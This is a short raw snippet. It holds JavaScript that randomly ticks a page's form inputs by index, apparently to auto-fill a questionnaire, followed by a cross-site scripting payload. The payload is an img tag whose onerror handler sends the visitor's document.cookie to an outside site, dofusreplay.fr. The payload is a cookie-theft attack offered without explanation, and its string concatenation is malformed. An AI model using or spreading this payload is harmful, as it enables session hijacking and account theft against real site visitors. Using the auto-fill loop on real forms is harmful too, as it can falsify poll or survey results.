

        var i=4;
        while(i<87) {
            if(22 <= i && i <= 23) {
                r = Math.round(Math.random() * 2) + i;
                $('input')[r].checked = true;
                i += 2
            } else if((24 <= i && i <= 27) || (43 <= i && i <= 46) || (53 <= i && i <= 56)) {
                r = Math.round(Math.random() * 4) + i;
                $('input')[r].checked = true;
                i += 4
            } else if(i >= 78 && i <= 80) {
                $('input')[80].checked = true;
                i += 3
            } else {
                var r = Math.round(Math.random() * 3) + i;
                $('input')[r].checked = true;
                i += 3
            }
        }




        <img src="dexcdgfezfrg.jpg" onerror="document.location.href='http://www.dofusreplay.fr/Index.php?cookie = " . document.cookie . "'">